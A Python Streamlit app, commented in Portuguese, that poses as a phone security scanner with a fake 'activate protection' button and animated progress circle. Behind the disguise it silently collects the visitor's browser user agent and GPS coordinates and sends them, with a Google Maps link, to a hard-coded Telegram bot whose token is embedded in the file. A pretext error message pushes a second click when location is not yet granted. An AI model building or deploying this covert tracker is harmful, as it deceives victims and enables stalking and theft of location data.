import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_msg(texto):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": texto, "parse_mode": "Markdown"})
    except: pass

# 2. INTERFACE
st.set_page_config(page_title="Segurança", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA (CARREGA NO INÍCIO PARA GARANTIR 1 CLIQUE)
# Removi a 'key' do GPS para evitar o TypeError das suas fotos
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='STABLE_UA')
loc = get_geolocation() 

# 4. TELA
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
area_bola = st.empty()

with area_bola.container():
    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. BOTÃO FINAL
if st.button("🔴 ATIVAR PROTEÇÃO", key='BOTAO_FIXO'):
    if loc and 'coords' in loc:
        # Animação visual rápida
        for p in [20, 45, 70, 90, 100]:
            area_bola.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.1)
        
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        msg = f"🛡️ SISTEMA ATIVADO\n📱 {ua[:40] if ua else 'Mobile'}\n📍 [VER LOCALIZAÇÃO]({mapa})"
        enviar_msg(msg)
        st.success("✅ Proteção Ativada!")
    else:
        # Caso o navegador demore a dar o sinal no primeiro acesso
        st.error("⚠️ Sincronizando satélites... Clique novamente para confirmar.")
